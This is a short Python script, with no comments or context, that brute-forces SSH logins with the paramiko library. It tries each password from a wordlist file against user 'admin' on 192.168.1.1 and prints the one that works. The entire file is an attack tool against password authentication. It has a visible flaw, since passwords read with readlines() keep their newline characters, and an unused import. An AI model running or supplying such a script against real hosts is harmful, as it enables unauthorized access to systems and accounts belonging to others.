import paramiko 
import time 
 
def bruteforce(ip, username, dictionary): 
    for password in dictionary: 
        try: 
            client = paramiko.SSHClient() 
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
            client.connect(ip, username=username, password=password) 
            print("Password found:", password) 
            client.close() 
            return 
        except paramiko.AuthenticationException: 
            pass 
 
if __name__ == "__main__": 
    ip = "192.168.1.1" 
    username = "admin" 
    dictionary = open("dictionary.txt", "r").readlines() 
    bruteforce(ip, username, dictionary)